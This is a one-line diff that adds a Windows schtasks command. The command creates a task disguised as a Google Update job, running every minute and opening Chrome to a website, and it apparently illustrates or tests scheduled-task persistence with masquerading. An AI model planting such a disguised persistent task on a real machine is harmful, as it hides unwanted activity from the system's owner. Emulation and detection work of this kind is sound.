@@ -1,0 +1,1 @@
+schtasks /create /sc minute /mo 1 /tn "GoogleUpdateTaskMachineX" /tr "'%ProgramFiles%\Google\Chrome\Application\chrome.exe' https://infosys.com"
